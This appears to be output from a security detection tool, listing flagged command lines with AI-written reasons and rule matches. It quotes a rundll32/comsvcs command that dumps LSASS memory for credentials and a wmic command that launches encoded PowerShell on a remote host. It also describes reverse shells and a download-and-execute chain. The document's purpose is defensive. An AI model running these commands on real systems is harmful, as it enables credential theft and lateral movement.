results.ai_reason: Heavily obfuscated shell launches hidden PowerShell to fetch and execute remote code, indicating deliberate download-and-execute behavior.
results.explanation: Cmd.exe is a known living-off-the-land binary (LOLBin) used to evade defensive countermeasures or to hide as a persistence mechanism, it matches a known detection rule for command line execution with suspicious url and appdata strings, it performs activity associated with the Defense Evasion phase, a high special-character density (32%), typical of obfuscated payloads, and heavy character escaping (21 caret escape characters). This activity aligns with the Command And Control stage of an attack.

results.ai_reason: Attempts LSASS memory dumping via comsvcs MiniDump, a strong credential theft indicator.
results.command_line: rundll32.exe C:\windows\temp\evil.dll,DllMain comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
results.command_preview: rundll32.exe C:\windows\temp\evil.dll,DllMain comsvcs.dll, MiniDump 624 C:\temp\lsass.dmp full
results.explanation: It matches a known detection rule for cobaltstrike load by rundll32, and it performs activity associated with the Credential Access phase. This activity aligns with the Stealth stage of an attack.

triggers.detail: it matches a known detection rule for cobaltstrike load by rundll32
it performs activity associated with the Credential Access phase

results.ai_reason: Perl one-liner establishes an interactive reverse shell to a remote host.

results.ai_reason: Uses remote WMI process creation to launch encoded PowerShell on another host, combining lateral movement and obfuscation.
results.command_line: wmic /node:10.0.0.5 process call create cmd.exe /c powershell -enc ZQB2AGkAbAA=
results.command_preview: wmic /node:10.0.0.5 process call create cmd.exe /c powershell -enc ZQB2AGkAbAA=

results.ai_reason: Bash uses a TCP file descriptor loop to provide remote command execution, indicating a reverse shell.
